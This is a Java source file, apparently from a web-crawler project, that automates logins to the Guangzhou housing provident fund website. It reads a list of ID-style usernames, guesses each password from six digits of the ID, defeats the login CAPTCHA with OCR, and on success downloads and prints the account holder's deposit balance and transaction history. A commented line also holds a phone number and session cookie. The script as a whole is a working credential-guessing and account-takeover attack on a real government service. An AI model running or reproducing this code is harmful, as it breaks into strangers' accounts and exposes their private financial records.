package yaycrawler.common.utils;

import com.alibaba.fastjson.JSON;
import com.google.common.collect.ImmutableMap;
import com.google.common.io.Files;
import org.apache.commons.collections.MapUtils;
import org.apache.commons.lang3.StringUtils;
import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.message.BasicHeader;
import org.apache.http.util.EntityUtils;

import java.io.*;
import java.util.*;

/**
 * @author bill
 * @create 2017-08-17 11:20
 * @desc 训练脚本
 **/
public class TesseractOcr {

    public static void main(String[] args) throws Exception {
        int i = 0,j = 0;
        File file = new File("c:/Users/bill/Desktop/test1");
        BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
        String temp = null;
        StringBuffer buffer = new StringBuffer();
        while ((temp=bufferedReader.readLine()) != null) {
            HttpUtil httpUtil = HttpUtil.getInstance();
            String username = temp.trim();
            String pwd = temp.substring(8,14);//"941129";
            String loginUrl = "https://gzgjj.gov.cn:8280/fund/wap/wap!userLogin.do";
            Map params = new HashMap();
            params.put("username", username);
            params.put("pwd", pwd);
            ArrayList<Header> headerList = new ArrayList<>();
            headerList.add(new BasicHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36"));
//        headerList.add(new BasicHeader("Cookie","rmbUser=true; username=15626241465; JSESSIONID=64087F3E57857B86EBF50EE8F8846933"));
//        headerList.add(new BasicHeader("",""));
//        headerList.add(new BasicHeader("",""));
//        headerList.add(new BasicHeader("",""));
//        headerList.add(new BasicHeader("",""));
//        headerList.add(new BasicHeader("",""));
//        headerList.add(new BasicHeader("",""));
//        headerList.add(new BasicHeader("",""));
            while (true) {
                try {
                    HttpResponse response = httpUtil.doGet("https://gzgjj.gov.cn:8280/fund/wap/wap!getImgCode.do?rnd=" + Math.random(), null, headerList);
                    if(response.getStatusLine().getStatusCode() != 302) {
                        Thread.sleep(2000);
                    }
                    if (response.getStatusLine().getStatusCode() != 200) {
                        continue;
                    }
                    Header header = response.getFirstHeader("Set-Cookie");
                    if (header != null)
                        headerList.add(new BasicHeader("Cookie", header.getValue()));
                    byte[] bytes = EntityUtils.toByteArray(response.getEntity());
                    String documentName = username + ".jpg";
                    File document = new File("d:/tmp/ocr/" + documentName);
                    Files.createParentDirs(document);
                    Files.write(bytes, document);
                    String recognizeText = new OCRHelper().recognizeText(document).trim().toLowerCase();
                    params.put("code", recognizeText);
                    Map code = httpUtil.doPostForMap(loginUrl, null, params, headerList);

                    if (code.get("ret_code").toString().equalsIgnoreCase("0")) {
                        System.out.println("************************" + i + "***********" + recognizeText + "*******"+username+"********");
                        headerList.add(new BasicHeader("Cookie", "rmbUser=true; username=" + username + ";"));
                        String content = EntityUtils.toString(httpUtil.doGet("https://gzgjj.gov.cn:8280/fund/wap/wap!depositQuery.do?rdm=" + Math.random(), null, headerList).getEntity());
                        System.out.println(content);
                        content = EntityUtils.toString(httpUtil.doGet("https://gzgjj.gov.cn:8280/fund/wap/wap!depositDetails.do?rdm=" + Math.random(), null, headerList).getEntity());
                        System.out.println(content);
                        i++;
                        buffer.append(username).append(";");
                        break;
                    } else if(code.get("ret_msg").toString().indexOf("未有该身份") > -1){
                        System.out.println(JSON.toJSONString(code + "$$$$$$$$$$$$$$$$" + username));
                        break;
                    } else if(code.get("ret_msg").toString().indexOf("密码") > -1){
                        buffer.append(username).append(";");
                        System.out.println("******************" + username + "*********************" + JSON.toJSONString(code));
                        break;
                    } else {
                        System.out.println(JSON.toJSONString(code));
                    }
                    j++;
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        System.out.println("#################"+i/j*1.0+"###################3");
    }
}
